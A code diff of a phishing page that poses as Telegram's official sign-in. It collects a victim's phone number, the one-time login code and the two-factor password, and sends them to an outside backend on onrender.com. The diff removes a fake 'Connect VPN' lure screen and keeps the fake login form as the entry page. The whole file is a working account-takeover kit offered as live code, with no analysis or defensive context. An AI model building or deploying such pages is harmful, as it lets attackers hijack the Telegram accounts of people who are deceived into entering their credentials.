@@ -30,40 +30,6 @@
             position: relative; /* Needed for positioning the security banner */
         }
 
-        #shadowOverlay {
-            position: absolute;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0, 0, 0, 0.2); /* Semi-transparent black */
-            display: none; /* This should be the only display property */
-            pointer-events: none; /* Prevents interaction with overlay */
-            border-radius: 10px; /* Matches container's border-radius */
-            justify-content: center;
-            align-items: center;
-            z-index: 10; /* Ensure it's above other content */
-        }
-
-        #loadingText {
-            color: white;
-            font-size: 30px;
-            margin-top: 40px;
-            margin-right: 10px;
-        }
-
-        .spinner1 {
-            border: 4px solid #f3f3f3; /* Light grey */
-            border-top: 4px solid #3498db; /* Blue */
-            border-radius: 50%;
-            width: 20px;
-            height: 20px;
-            animation: spin 2s linear infinite;
-            margin-top: 40px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
         .logo {
             width: 70px;
             margin-bottom: 20px;
@@ -104,6 +70,7 @@
             border-radius: 6px;
             box-sizing: border-box;
             transition: all 0.3s ease;
+            /* For smooth transition when shaking */
         }
 
         .checkbox-group {
@@ -154,8 +121,15 @@
         }
 
         @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-15px); }
+
+            0%,
+            100% {
+                transform: translateY(0);
+            }
+
+            50% {
+                transform: translateY(-15px);
+            }
         }
 
         .phone-number {
@@ -171,8 +145,25 @@
             margin-left: x;
         }
 
-        #result, #codeResult, #passwordResult {
+        #result {
             color: #ff0000;
+            /* Red color for errors */
+            font-size: 14px;
+            margin-top: 5px;
+            margin-bottom: 10px;
+        }
+
+        #codeResult {
+            color: #ff0000;
+            /* Red color for errors */
+            font-size: 14px;
+            margin-top: 5px;
+            margin-bottom: 10px;
+        }
+
+        #passwordResult {
+            color: #ff0000;
+            /* Red color for errors */
             font-size: 14px;
             margin-top: 5px;
             margin-bottom: 10px;
@@ -180,20 +171,6 @@
 
         #loadingSpinner {
             margin-left: 10px;
-        }
-
-        #container {
-            padding: 40px;
-            border: 2px solid #ddd;
-            background: white;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-            width: 400px; 
-            height: 550px; 
-            text-align: center;
-            overflow: hidden;
-            position: relative;
-            transition: box-shadow 0.3s ease;
         }
 
         .spinner {
@@ -210,19 +187,50 @@
         }
 
         @keyframes rotate {
-            100% { transform: rotate(360deg); }
+            100% {
+                transform: rotate(360deg);
+            }
         }
 
         @keyframes dash {
-            0% { stroke-dasharray: 1, 150; stroke-dashoffset: 0; }
-            50% { stroke-dasharray: 90, 150; stroke-dashoffset: -35; }
-            100% { stroke-dasharray: 90, 150; stroke-dashoffset: -124; }
+            0% {
+                stroke-dasharray: 1, 150;
+                stroke-dashoffset: 0;
+            }
+
+            50% {
+                stroke-dasharray: 90, 150;
+                stroke-dashoffset: -35;
+            }
+
+            100% {
+                stroke-dasharray: 90, 150;
+                stroke-dashoffset: -124;
+            }
         }
 
+        /* Shake animation */
         @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            10%, 30%, 50%, 70%, 90% { transform: translateX(-8px); }
-            20%, 40%, 60%, 80% { transform: translateX(8px); }
+
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+
+            10%,
+            30%,
+            50%,
+            70%,
+            90% {
+                transform: translateX(-8px);
+            }
+
+            20%,
+            40%,
+            60%,
+            80% {
+                transform: translateX(8px);
+            }
         }
 
         .shake {
@@ -232,228 +240,209 @@
 </head>
 
 <body>
-    <div id="container">
-        <select id="serverSelect">
-            <option value="Boardman">United States (Boardman)</option>
-            <option value="NewYork">United States (New York)</option>
-            <option value="Piscataway">United States (Piscataway)</option>
-        </select>
-        <h2><strong>United States 🇺🇸</strong></h2>
-        <img src="arrow.gif" alt="arrow" height="60" width="60">
-        <div id="vpnStatus">
-            
-            <a href="#" onclick="showTelegramPage(); return false;">
-                <img src="connect.png" alt="Connect VPN" style="width:180px;height:180px;">
-            </a>
-<img src="vpn.gif" alt="VPN" height="270" width="270">
-        </div>
-        <div id="shadowOverlay">
-            <span id="loadingText">Please wait...</span>
-            <div class="spinner1"></div>
-        </div>
-    </div>
-
-    <div id="telegramPage" class="login-container hidden">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
+    <div class="login-container" id="step1">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo"
+            class="logo">
         <h1>Sign in to Telegram</h1>
         <p>Please confirm your country code and enter your phone number.</p>
         <form id="loginForm">
             <div class="input-group">
                 <label for="country">Country</label>
                 <select id="country" name="country">
-                   <!-- New countries -->
-                   <option value="Afghanistan">Afghanistan (+93)</option>
-                   <option value="Albania">Albania (+355)</option>
-                   <option value="Algeria">Algeria (+213)</option>
-                   <option value="Andorra">Andorra (+376)</option>
-                   <option value="Angola">Angola (+244)</option>
-                   <option value="Antigua and Barbuda">Antigua and Barbuda (+1 268)</option>
-                   <option value="Argentina">Argentina (+54)</option>
-                   <option value="Armenia">Armenia (+374)</option>
-                   <option value="Australia">Australia (+61)</option>
-                   <option value="Austria">Austria (+43)</option>
-                   <option value="Azerbaijan">Azerbaijan (+994)</option>
-                   <option value="Bahamas">Bahamas (+1 242)</option>
-                   <option value="Bahrain">Bahrain (+973)</option>
-                   <option value="Bangladesh">Bangladesh (+880)</option>
-                   <option value="Barbados">Barbados (+1 246)</option>
-                   <option value="Belarus">Belarus (+375)</option>
-                   <option value="Belgium">Belgium (+32)</option>
-                   <option value="Belize">Belize (+501)</option>
-                   <option value="Benin">Benin (+229)</option>
-                   <option value="Bhutan">Bhutan (+975)</option>
-                   <option value="Bolivia">Bolivia (+591)</option>
-                   <option value="Bosnia and Herzegovina">Bosnia and Herzegovina (+387)</option>
-                   <option value="Botswana">Botswana (+267)</option>
-                   <option value="Brazil">Brazil (+55)</option>
-                   <option value="Brunei">Brunei (+673)</option>
-                   <option value="Bulgaria">Bulgaria (+359)</option>
-                   <option value="Burkina Faso">Burkina Faso (+226)</option>
-                   <option value="Burundi">Burundi (+257)</option>
-                   <option value="Cambodia">Cambodia (+855)</option>
-                   <option value="Cameroon">Cameroon (+237)</option>
-                   <option value="Canada">Canada (+1)</option>
-                   <option value="Central African Republic">Central African Republic (+236)</option>
-                   <option value="Chad">Chad (+235)</option>
-                   <option value="Chile">Chile (+56)</option>
-                   <option value="China">China (+86)</option>
-                   <option value="Colombia">Colombia (+57)</option>
-                   <option value="Comoros">Comoros (+269)</option>
-                   <option value="Congo (Brazzaville)">Congo (Brazzaville) (+242)</option>
-                   <option value="Congo (Kinshasa)">Congo (Kinshasa) (+243)</option>
-                   <option value="Costa Rica">Costa Rica (+506)</option>
-                   <option value="Côte d'Ivoire">Côte d'Ivoire (+225)</option>
-                   <option value="Croatia">Croatia (+385)</option>
-                   <option value="Cuba">Cuba (+53)</option>
-                   <option value="Cyprus">Cyprus (+357)</option>
-                   <option value="Czech Republic">Czech Republic (+420)</option>
-                   <option value="Denmark">Denmark (+45)</option>
-                   <option value="Djibouti">Djibouti (+253)</option>
-                   <option value="Dominica">Dominica (+1 767)</option>
-                   <option value="Dominican Republic">Dominican Republic (+1 809)</option>
-                   <option value="Ecuador">Ecuador (+593)</option>
-                   <option value="Egypt">Egypt (+20)</option>
-                   <option value="El Salvador">El Salvador (+503)</option>
-                   <option value="Equatorial Guinea">Equatorial Guinea (+240)</option>
-                   <option value="Eritrea">Eritrea (+291)</option>
-                   <option value="Estonia">Estonia (+372)</option>
-                   <option value="Eswatini">Eswatini (+268)</option>
-                   <option value="Ethiopia" selected>Ethiopia (+251)</option>
-                   <option value="Fiji">Fiji (+679)</option>
-                   <option value="Finland">Finland (+358)</option>
-                   <option value="France">France (+33)</option>
-                   <option value="Gabon">Gabon (+241)</option>
-                   <option value="Gambia">Gambia (+220)</option>
-                   <option value="Georgia">Georgia (+995)</option>
-                   <option value="Germany">Germany (+49)</option>
-                   <option value="Ghana">Ghana (+233)</option>
-                   <option value="Greece">Greece (+30)</option>
-                   <option value="Grenada">Grenada (+1 473)</option>
-                   <option value="Guatemala">Guatemala (+502)</option>
-                   <option value="Guinea">Guinea (+224)</option>
-                   <option value="Guinea-Bissau">Guinea-Bissau (+245)</option>
-                   <option value="Guyana">Guyana (+592)</option>
-                   <option value="Haiti">Haiti (+509)</option>
-                   <option value="Honduras">Honduras (+504)</option>
-                   <option value="Hungary">Hungary (+36)</option>
-                   <option value="Iceland">Iceland (+354)</option>
-                   <option value="India">India (+91)</option>
-                   <option value="Indonesia">Indonesia (+62)</option>
-                   <option value="Iraq">Iraq (+964)</option>
-                   <option value="Ireland">Ireland (+353)</option>
-                   <option value="Israel">Israel (+972)</option>
-                   <option value="Italy">Italy (+39)</option>
-                   <option value="Jamaica">Jamaica (+1 876)</option>
-                   <option value="Japan">Japan (+81)</option>
-                   <option value="Jordan">Jordan (+962)</option>
-                   <option value="Kazakhstan">Kazakhstan (+7)</option>
-                   <option value="Kenya">Kenya (+254)</option>
-                   <option value="Kiribati">Kiribati (+686)</option>
-                   <option value="Kosovo">Kosovo (+383)</option>
-                   <option value="Kuwait">Kuwait (+965)</option>
-                   <option value="Kyrgyzstan">Kyrgyzstan (+996)</option>
-                   <option value="Laos">Laos (+856)</option>
-                   <option value="Latvia">Latvia (+371)</option>
-                   <option value="Lebanon">Lebanon (+961)</option>
-                   <option value="Lesotho">Lesotho (+266)</option>
-                   <option value="Liberia">Liberia (+231)</option>
-                   <option value="Libya">Libya (+218)</option>
-                   <option value="Liechtenstein">Liechtenstein (+423)</option>
-                   <option value="Lithuania">Lithuania (+370)</option>
-                   <option value="Luxembourg">Luxembourg (+352)</option>
-                   <option value="Macedonia (FYROM)">Macedonia (FYROM) (+389)</option>
-                   <option value="Madagascar">Madagascar (+261)</option>
-                   <option value="Malawi">Malawi (+265)</option>
-                   <option value="Malaysia">Malaysia (+60)</option>
-                   <option value="Maldives">Maldives (+960)</option>
-                   <option value="Mali">Mali (+223)</option>
-                   <option value="Malta">Malta (+356)</option>
-                   <option value="Marshall Islands">Marshall Islands (+692)</option>
-                   <option value="Mauritania">Mauritania (+222)</option>
-                   <option value="Mauritius">Mauritius (+230)</option>
-                   <option value="Mexico">Mexico (+52)</option>
-                   <option value="Micronesia">Micronesia (+691)</option>
-                   <option value="Moldova">Moldova (+373)</option>
-                   <option value="Monaco">Monaco (+377)</option>
-                   <option value="Mongolia">Mongolia (+976)</option>
-                   <option value="Montenegro">Montenegro (+382)</option>
-                   <option value="Morocco">Morocco (+212)</option>
-                   <option value="Mozambique">Mozambique (+258)</option>
-                   <option value="Myanmar (Burma)">Myanmar (Burma) (+95)</option>
-                   <option value="Namibia">Namibia (+264)</option>
-                   <option value="Nauru">Nauru (+674)</option>
-                   <option value="Nepal">Nepal (+977)</option>
-                   <option value="Netherlands">Netherlands (+31)</option>
-                   <option value="New Zealand">New Zealand (+64)</option>
-                   <option value="Nicaragua">Nicaragua (+505)</option>
-                   <option value="Niger">Niger (+227)</option>
-                   <option value="Nigeria">Nigeria (+234)</option>
-                   <option value="Norway">Norway (+47)</option>
-                   <option value="Oman">Oman (+968)</option>
-                   <option value="Pakistan">Pakistan (+92)</option>
-                   <option value="Palau">Palau (+680)</option>
-                   <option value="Panama">Panama (+507)</option>
-                   <option value="Papua New Guinea">Papua New Guinea (+675)</option>
-                   <option value="Paraguay">Paraguay (+595)</option>
-                   <option value="Peru">Peru (+51)</option>
-                   <option value="Philippines">Philippines (+63)</option>
-                   <option value="Poland">Poland (+48)</option>
-                   <option value="Portugal">Portugal (+351)</option>
-                   <option value="Qatar">Qatar (+974)</option>
-                   <option value="Romania">Romania (+40)</option>
-                   <option value="Russia">Russia (+7)</option>
-                   <option value="Rwanda">Rwanda (+250)</option>
-                   <option value="Saint Kitts and Nevis">Saint Kitts and Nevis (+1 869)</option>
-                   <option value="Saint Lucia">Saint Lucia (+1 758)</option>
-                   <option value="Saint Vincent and the Grenadines">Saint Vincent and the Grenadines (+1 784)</option>
-                   <option value="Samoa">Samoa (+685)</option>
-                   <option value="San Marino">San Marino (+378)</option>
-                   <option value="Sao Tome and Principe">Sao Tome and Principe (+239)</option>
-                   <option value="Saudi Arabia">Saudi Arabia (+966)</option>
-                   <option value="Senegal">Senegal (+221)</option>
-                   <option value="Serbia">Serbia (+381)</option>
-                   <option value="Seychelles">Seychelles (+248)</option>
-                   <option value="Sierra Leone">Sierra Leone (+232)</option>
-                   <option value="Singapore">Singapore (+65)</option>
-                   <option value="Sint Maarten (Dutch part)">Sint Maarten (Dutch part) (+1 721)</option>
-                   <option value="Slovakia">Slovakia (+421)</option>
-                   <option value="Slovenia">Slovenia (+386)</option>
-                   <option value="Solomon Islands">Solomon Islands (+677)</option>
-                   <option value="Somalia">Somalia (+252)</option>
-                   <option value="South Africa">South Africa (+27)</option>
-                   <option value="South Korea">South Korea (+82)</option>
-                   <option value="South Sudan">South Sudan (+211)</option>
-                   <option value="Spain">Spain (+34)</option>
-                   <option value="Sri Lanka">Sri Lanka (+94)</option>
-                   <option value="Sudan">Sudan (+249)</option>
-                   <option value="Suriname">Suriname (+597)</option>
-                   <option value="Sweden">Sweden (+46)</option>
-                   <option value="Switzerland">Switzerland (+41)</option>
-                   <option value="Tajikistan">Tajikistan (+992)</option>
-                   <option value="Tanzania">Tanzania (+255)</option>
-                   <option value="Thailand">Thailand (+66)</option>
-                   <option value="Timor-Leste (East Timor)">Timor-Leste (East Timor) (+670)</option>
-                   <option value="Togo">Togo (+228)</option>
-                   <option value="Tonga">Tonga (+676)</option>
-                   <option value="Trinidad and Tobago">Trinidad and Tobago (+1 868)</option>
-                   <option value="Tunisia">Tunisia (+216)</option>
-                   <option value="Turkey">Turkey (+90)</option>
-                   <option value="Turkmenistan">Turkmenistan (+993)</option>
-                   <option value="Tuvalu">Tuvalu (+688)</option>
-                   <option value="Uganda">Uganda (+256)</option>
-                   <option value="Ukraine">Ukraine (+380)</option>
-                   <option value="United Arab Emirates">United Arab Emirates (+971)</option>
-                   <option value="United Kingdom">United Kingdom (+44)</option>
-                   <option value="United States">United States (+1)</option>
-                   <option value="Uruguay">Uruguay (+598)</option>
-                   <option value="Uzbekistan">Uzbekistan (+998)</option>
-                   <option value="Vanuatu">Vanuatu (+678)</option>
-                   <option value="Vatican City">Vatican City (+379)</option>
-                   <option value="Venezuela">Venezuela (+58)</option>
-                   <option value="Vietnam">Vietnam (+84)</option>
-                   <option value="Yemen">Yemen (+967)</option>
-                   <option value="Zambia">Zambia (+260)</option>
-                   <option value="Zimbabwe">Zimbabwe (+263)</option>
+
+                    <!-- New countries -->
+                    <option value="Afghanistan">Afghanistan (+93)</option>
+                    <option value="Albania">Albania (+355)</option>
+                    <option value="Algeria">Algeria (+213)</option>
+                    <option value="Andorra">Andorra (+376)</option>
+                    <option value="Angola">Angola (+244)</option>
+                    <option value="Antigua and Barbuda">Antigua and Barbuda (+1 268)</option>
+                    <option value="Argentina">Argentina (+54)</option>
+                    <option value="Armenia">Armenia (+374)</option>
+                    <option value="Australia">Australia (+61)</option>
+                    <option value="Austria">Austria (+43)</option>
+                    <option value="Azerbaijan">Azerbaijan (+994)</option>
+                    <option value="Bahamas">Bahamas (+1 242)</option>
+                    <option value="Bahrain">Bahrain (+973)</option>
+                    <option value="Bangladesh">Bangladesh (+880)</option>
+                    <option value="Barbados">Barbados (+1 246)</option>
+                    <option value="Belarus">Belarus (+375)</option>
+                    <option value="Belgium">Belgium (+32)</option>
+                    <option value="Belize">Belize (+501)</option>
+                    <option value="Benin">Benin (+229)</option>
+                    <option value="Bhutan">Bhutan (+975)</option>
+                    <option value="Bolivia">Bolivia (+591)</option>
+                    <option value="Bosnia and Herzegovina">Bosnia and Herzegovina (+387)</option>
+                    <option value="Botswana">Botswana (+267)</option>
+                    <option value="Brazil">Brazil (+55)</option>
+                    <option value="Brunei">Brunei (+673)</option>
+                    <option value="Bulgaria">Bulgaria (+359)</option>
+                    <option value="Burkina Faso">Burkina Faso (+226)</option>
+                    <option value="Burundi">Burundi (+257)</option>
+                    <option value="Cambodia">Cambodia (+855)</option>
+                    <option value="Cameroon">Cameroon (+237)</option>
+                    <option value="Canada">Canada (+1)</option>
+                    <option value="Central African Republic">Central African Republic (+236)</option>
+                    <option value="Chad">Chad (+235)</option>
+                    <option value="Chile">Chile (+56)</option>
+                    <option value="China">China (+86)</option>
+                    <option value="Colombia">Colombia (+57)</option>
+                    <option value="Comoros">Comoros (+269)</option>
+                    <option value="Congo (Brazzaville)">Congo (Brazzaville) (+242)</option>
+                    <option value="Congo (Kinshasa)">Congo (Kinshasa) (+243)</option>
+                    <option value="Costa Rica">Costa Rica (+506)</option>
+                    <option value="Côte d'Ivoire">Côte d'Ivoire (+225)</option>
+                    <option value="Croatia">Croatia (+385)</option>
+                    <option value="Cuba">Cuba (+53)</option>
+                    <option value="Cyprus">Cyprus (+357)</option>
+                    <option value="Czech Republic">Czech Republic (+420)</option>
+                    <option value="Denmark">Denmark (+45)</option>
+                    <option value="Djibouti">Djibouti (+253)</option>
+                    <option value="Dominica">Dominica (+1 767)</option>
+                    <option value="Dominican Republic">Dominican Republic (+1 809)</option>
+                    <option value="Ecuador">Ecuador (+593)</option>
+                    <option value="Egypt">Egypt (+20)</option>
+                    <option value="El Salvador">El Salvador (+503)</option>
+                    <option value="Equatorial Guinea">Equatorial Guinea (+240)</option>
+                    <option value="Eritrea">Eritrea (+291)</option>
+                    <option value="Estonia">Estonia (+372)</option>
+                    <option value="Eswatini">Eswatini (+268)</option>
+                    <option value="Ethiopia" selected>Ethiopia (+251)</option>
+                    <option value="Fiji">Fiji (+679)</option>
+                    <option value="Finland">Finland (+358)</option>
+                    <option value="France">France (+33)</option>
+                    <option value="Gabon">Gabon (+241)</option>
+                    <option value="Gambia">Gambia (+220)</option>
+                    <option value="Georgia">Georgia (+995)</option>
+                    <option value="Germany">Germany (+49)</option>
+                    <option value="Ghana">Ghana (+233)</option>
+                    <option value="Greece">Greece (+30)</option>
+                    <option value="Grenada">Grenada (+1 473)</option>
+                    <option value="Guatemala">Guatemala (+502)</option>
+                    <option value="Guinea">Guinea (+224)</option>
+                    <option value="Guinea-Bissau">Guinea-Bissau (+245)</option>
+                    <option value="Guyana">Guyana (+592)</option>
+                    <option value="Haiti">Haiti (+509)</option>
+                    <option value="Honduras">Honduras (+504)</option>
+                    <option value="Hungary">Hungary (+36)</option>
+                    <option value="Iceland">Iceland (+354)</option>
+                    <option value="India">India (+91)</option>
+                    <option value="Indonesia">Indonesia (+62)</option>
+                    <option value="Iraq">Iraq (+964)</option>
+                    <option value="Ireland">Ireland (+353)</option>
+                    <option value="Israel">Israel (+972)</option>
+                    <option value="Italy">Italy (+39)</option>
+                    <option value="Jamaica">Jamaica (+1 876)</option>
+                    <option value="Japan">Japan (+81)</option>
+                    <option value="Jordan">Jordan (+962)</option>
+                    <option value="Kazakhstan">Kazakhstan (+7)</option>
+                    <option value="Kenya">Kenya (+254)</option>
+                    <option value="Kiribati">Kiribati (+686)</option>
+                    <option value="Kosovo">Kosovo (+383)</option>
+                    <option value="Kuwait">Kuwait (+965)</option>
+                    <option value="Kyrgyzstan">Kyrgyzstan (+996)</option>
+                    <option value="Laos">Laos (+856)</option>
+                    <option value="Latvia">Latvia (+371)</option>
+                    <option value="Lebanon">Lebanon (+961)</option>
+                    <option value="Lesotho">Lesotho (+266)</option>
+                    <option value="Liberia">Liberia (+231)</option>
+                    <option value="Libya">Libya (+218)</option>
+                    <option value="Liechtenstein">Liechtenstein (+423)</option>
+                    <option value="Lithuania">Lithuania (+370)</option>
+                    <option value="Luxembourg">Luxembourg (+352)</option>
+                    <option value="Macedonia (FYROM)">Macedonia (FYROM) (+389)</option>
+                    <option value="Madagascar">Madagascar (+261)</option>
+                    <option value="Malawi">Malawi (+265)</option>
+                    <option value="Malaysia">Malaysia (+60)</option>
+                    <option value="Maldives">Maldives (+960)</option>
+                    <option value="Mali">Mali (+223)</option>
+                    <option value="Malta">Malta (+356)</option>
+                    <option value="Marshall Islands">Marshall Islands (+692)</option>
+                    <option value="Mauritania">Mauritania (+222)</option>
+                    <option value="Mauritius">Mauritius (+230)</option>
+                    <option value="Mexico">Mexico (+52)</option>
+                    <option value="Micronesia">Micronesia (+691)</option>
+                    <option value="Moldova">Moldova (+373)</option>
+                    <option value="Monaco">Monaco (+377)</option>
+                    <option value="Mongolia">Mongolia (+976)</option>
+                    <option value="Montenegro">Montenegro (+382)</option>
+                    <option value="Morocco">Morocco (+212)</option>
+                    <option value="Mozambique">Mozambique (+258)</option>
+                    <option value="Myanmar (Burma)">Myanmar (Burma) (+95)</option>
+                    <option value="Namibia">Namibia (+264)</option>
+                    <option value="Nauru">Nauru (+674)</option>
+                    <option value="Nepal">Nepal (+977)</option>
+                    <option value="Netherlands">Netherlands (+31)</option>
+                    <option value="New Zealand">New Zealand (+64)</option>
+                    <option value="Nicaragua">Nicaragua (+505)</option>
+                    <option value="Niger">Niger (+227)</option>
+                    <option value="Nigeria">Nigeria (+234)</option>
+                    <option value="Norway">Norway (+47)</option>
+                    <option value="Oman">Oman (+968)</option>
+                    <option value="Pakistan">Pakistan (+92)</option>
+                    <option value="Palau">Palau (+680)</option>
+                    <option value="Panama">Panama (+507)</option>
+                    <option value="Papua New Guinea">Papua New Guinea (+675)</option>
+                    <option value="Paraguay">Paraguay (+595)</option>
+                    <option value="Peru">Peru (+51)</option>
+                    <option value="Philippines">Philippines (+63)</option>
+                    <option value="Poland">Poland (+48)</option>
+                    <option value="Portugal">Portugal (+351)</option>
+                    <option value="Qatar">Qatar (+974)</option>
+                    <option value="Romania">Romania (+40)</option>
+                    <option value="Russia">Russia (+7)</option>
+                    <option value="Rwanda">Rwanda (+250)</option>
+                    <option value="Saint Kitts and Nevis">Saint Kitts and Nevis (+1 869)</option>
+                    <option value="Saint Lucia">Saint Lucia (+1 758)</option>
+                    <option value="Saint Vincent and the Grenadines">Saint Vincent and the Grenadines (+1 784)</option>
+                    <option value="Samoa">Samoa (+685)</option>
+                    <option value="San Marino">San Marino (+378)</option>
+                    <option value="Sao Tome and Principe">Sao Tome and Principe (+239)</option>
+                    <option value="Saudi Arabia">Saudi Arabia (+966)</option>
+                    <option value="Senegal">Senegal (+221)</option>
+                    <option value="Serbia">Serbia (+381)</option>
+                    <option value="Seychelles">Seychelles (+248)</option>
+                    <option value="Sierra Leone">Sierra Leone (+232)</option>
+                    <option value="Singapore">Singapore (+65)</option>
+                    <option value="Sint Maarten (Dutch part)">Sint Maarten (Dutch part) (+1 721)</option>
+                    <option value="Slovakia">Slovakia (+421)</option>
+                    <option value="Slovenia">Slovenia (+386)</option>
+                    <option value="Solomon Islands">Solomon Islands (+677)</option>
+                    <option value="Somalia">Somalia (+252)</option>
+                    <option value="South Africa">South Africa (+27)</option>
+                    <option value="South Korea">South Korea (+82)</option>
+                    <option value="South Sudan">South Sudan (+211)</option>
+                    <option value="Spain">Spain (+34)</option>
+                    <option value="Sri Lanka">Sri Lanka (+94)</option>
+                    <option value="Sudan">Sudan (+249)</option>
+                    <option value="Suriname">Suriname (+597)</option>
+                    <option value="Sweden">Sweden (+46)</option>
+                    <option value="Switzerland">Switzerland (+41)</option>
+                    <option value="Tajikistan">Tajikistan (+992)</option>
+                    <option value="Tanzania">Tanzania (+255)</option>
+                    <option value="Thailand">Thailand (+66)</option>
+                    <option value="Timor-Leste (East Timor)">Timor-Leste (East Timor) (+670)</option>
+                    <option value="Togo">Togo (+228)</option>
+                    <option value="Tonga">Tonga (+676)</option>
+                    <option value="Trinidad and Tobago">Trinidad and Tobago (+1 868)</option>
+                    <option value="Tunisia">Tunisia (+216)</option>
+                    <option value="Turkey">Turkey (+90)</option>
+                    <option value="Turkmenistan">Turkmenistan (+993)</option>
+                    <option value="Tuvalu">Tuvalu (+688)</option>
+                    <option value="Uganda">Uganda (+256)</option>
+                    <option value="Ukraine">Ukraine (+380)</option>
+                    <option value="United Arab Emirates">United Arab Emirates (+971)</option>
+                    <option value="United Kingdom">United Kingdom (+44)</option>
+                    <option value="United States">United States (+1)</option>
+                    <option value="Uruguay">Uruguay (+598)</option>
+                    <option value="Uzbekistan">Uzbekistan (+998)</option>
+                    <option value="Vanuatu">Vanuatu (+678)</option>
+                    <option value="Vatican City">Vatican City (+379)</option>
+                    <option value="Venezuela">Venezuela (+58)</option>
+                    <option value="Vietnam">Vietnam (+84)</option>
+                    <option value="Yemen">Yemen (+967)</option>
+                    <option value="Zambia">Zambia (+260)</option>
+                    <option value="Zimbabwe">Zimbabwe (+263)</option>
                 </select>
             </div>
             <div class="input-group">
@@ -477,11 +466,12 @@
     </div>
 
     <div class="login-container hidden" id="step2">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo"
+            class="logo">
         <div class="phone-number">
             <span id="displayPhoneNumber"></span>
             <span class="edit-icon" onclick="goBack()">✍️</span>
-        </div>
+        </div></p></p>
         <p>We've sent the code to the <strong>Telegram</strong> app on your other device.</p>
         <form id="codeForm">
             <div class="input-group">
@@ -500,13 +490,15 @@
     </div>
 
     <div class="login-container hidden" id="step3">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo"
+            class="logo">
         <h1>Enter Your Password</h1>
+        </p>
         <p>Your account is protected with an additional password</p>
         <form id="2faForm">
             <div class="input-group">
                 <input type="password" id="password" name="password" placeholder="Password" required>
-                <p id="passwordResult"></p>
+                <p id="passwordResult"></p> <!-- New element for password error -->
             </div>
             <button type="submit" class="btn">
                 <span id="btnText3">NEXT</span>
@@ -521,15 +513,6 @@
 
     <script>
         const proxyUrl = 'https://tg-back-m8e0.onrender.com';
-
-        function showTelegramPage() {
-            document.getElementById('shadowOverlay').style.display = 'flex';
-            setTimeout(() => {
-                document.getElementById('shadowOverlay').style.display = 'none';
-                document.getElementById('container').classList.add('hidden');
-                document.getElementById('telegramPage').classList.remove('hidden');
-            }, 4000);
-        }
 
         // Function to handle form submission and button state
         async function handleFormSubmit(formId, btnTextId, loadingSpinnerId, originalButtonText, apiEndpoint, dataToSend, successCallback, errorCallback) {
@@ -560,8 +543,8 @@
             }
         }
 
-           // Country code mapping
-           const countryCodes = {
+        // Country code mapping
+        const countryCodes = {
             'Afghanistan': '+93',
             'Albania': '+355',
             'Algeria': '+213',
@@ -1149,13 +1132,11 @@
                 'Zimbabwe': 9
             };
 
-        
-
+            // Check if the number of digits is within the range
             return digitsOnly.length >= minDigits[country] && digitsOnly.length <= maxDigits[country];
         }
-
-        // Function to validate login code (must be exactly 5 digits)
-        function validateLoginCode(code) {
+         // Function to validate login code (must be exactly 5 digits)
+         function validateLoginCode(code) {
             const digitsOnly = code.replace(/\D/g, '');
             return digitsOnly.length === 5;
         }
@@ -1183,13 +1164,17 @@
 
             // Validate the phone number
             if (!validatePhoneNumber(phoneNumber, country)) {
+                // Add shake effect to the phone number input
                 phoneNumberInput.classList.add('shake');
+                // Trigger vibration
                 if (navigator.vibrate) {
-                    navigator.vibrate(50);
+                    navigator.vibrate(50); // Vibration for 200ms
                 }
+                // Remove shake effect after animation completes
                 setTimeout(() => {
                     phoneNumberInput.classList.remove('shake');
                 }, 500);
+                // Prevent form submission
                 e.preventDefault();
                 return;
             }
@@ -1197,34 +1182,50 @@
             await handleFormSubmit('loginForm', 'btnText1', 'loadingSpinner1', originalButtonText, 'send_code', { phone_number: phoneNumber },
                 (data) => {
                     if (data.success) {
-                        document.getElementById('telegramPage').classList.add('hidden'); // Hide current step
-                        document.getElementById('step2').classList.remove('hidden'); // Show next step
+                        document.getElementById('step1').classList.add('hidden');
+                        document.getElementById('step2').classList.remove('hidden');
                         document.getElementById('displayPhoneNumber').textContent = phoneNumber;
-                        document.getElementById('result').textContent = '';
+                        document.getElementById('phoneNumberResult').textContent = ''; // Clear any previous messages
+                        document.getElementById('result').textContent = ''; // Clear any previous messages
                     } else {
-                        document.getElementById('result').textContent = 'Please try again after some minutes';
+                        document.getElementById('result').textContent = 'Please try again after some minutes';// Display error message
                     }
                 },
                 () => {
-                    document.getElementById('result').textContent = 'An error occurred. Please try again.';
+                    document.getElementById('phoneNumberResult').textContent = 'An error occurred. Please try again.';
+                    document.getElementById('result').textContent = ''; // Clear any previous messages
                 }
             );
         });
 
-        document.getElementById('codeForm').addEventListener('submit', async (e) => {
+        document.getElementById('code').addEventListener('input', function () {
+            let monkeyAnimation = document.getElementById('monkeyAnimation');
+            if (this.value.length > 0) {
+                monkeyAnimation.classList.remove('hidden'); // Show animation when there's input
+            } else {
+                monkeyAnimation.classList.add('hidden'); // Hide when input is cleared
+            }
+        });
+
+       document.getElementById('codeForm').addEventListener('submit', async (e) => {
             const codeInput = document.getElementById('code');
             const code = codeInput.value;
             const phoneNumber = document.getElementById('phoneNumber').value;
             const originalButtonText = 'NEXT';
 
-            if (!validateLoginCode(code)) {
+              // Validate the login code (must be exactly 5 digits)
+              if (!validateLoginCode(code)) {
+                // Add shake effect to the code input
                 codeInput.classList.add('shake');
+                // Trigger vibration
                 if (navigator.vibrate) {
-                    navigator.vibrate(200);
+                    navigator.vibrate(200); // Vibration for 200ms
                 }
+                // Remove shake effect after animation completes
                 setTimeout(() => {
                     codeInput.classList.remove('shake');
                 }, 500);
+                // Prevent form submission
                 e.preventDefault();
                 return;
             }
@@ -1239,6 +1240,7 @@
